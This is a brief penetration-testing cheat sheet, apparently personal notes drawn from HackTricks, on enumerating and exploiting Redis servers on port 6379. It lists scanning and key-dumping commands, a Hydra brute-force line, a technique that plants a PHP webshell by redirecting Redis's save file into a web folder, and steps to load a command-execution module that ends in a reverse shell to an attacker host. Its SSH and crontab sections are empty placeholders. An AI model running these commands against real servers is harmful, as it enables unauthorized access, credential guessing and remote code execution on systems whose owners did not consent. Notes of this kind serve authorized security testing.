# Redis (6379)

--- 

> https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

### 1) Redis Enumeration

Automated enumeration:
- `nmap --script redis-info -sV -p 6379 <IP>`
- with Metasploit: `use auxiliary/scanner/redis/redis_server`

With netcat or redis-cli:
- `nc -vn 10.10.10.10 6379` or `redis-cli -h <IP>`
- then issue commands: `info`, `client list`, `CONFIG GET *`
- if you see `# Keyspace` in output of `info` then you can enumerate databases:
	- a) select DB number (i.e. `SELECT 1`)
	- b) view keys with `KEYS *`
	- c) get a key with `GET <KEY>`
	- d) dump the DB with npm ([redis-dump](https://www.npmjs.com/package/redis-dump)) or Python ([redis-utils](https://pypi.org/project/redis-utils/))
- if `-NOAUTH Authentication required.` shown then you need valid credentials to access Redis instance
- if you have credentials run `AUTH <username> <password>` after connecting
- if not try to brute force with `hydra â€“P /path/pass.txt redis://<IP>:<PORT>`


<br>

### 2) Redis Exploitation

Webshell:
> you must know the path of the website folder
- `redis-cli -h <IP>`
- `config set dir </path/to/website>`
- `config set dbfilename redis.php`
- `set test "<?php phpinfo(); ?>"`
- `save`

SSH:
- ...


Crontab:
- ... 


Load Redis Module: 
- visit GitHub for "RedisModules-ExecuteCommand" and clone it
- compile the module (i.e. `make`)
- upload the compile module to target
- load the module at runtime from `redis-cli` with `MODULE LOAD /path/to/module.so` and check success with `MODULE LIST`
- execute commands from `redis-cli`
	- i.e. `system.exec "id"``
	- i.e. `system.exec "whoami"``
- get a reverse shell with `system.rev <lhost> <lport>`
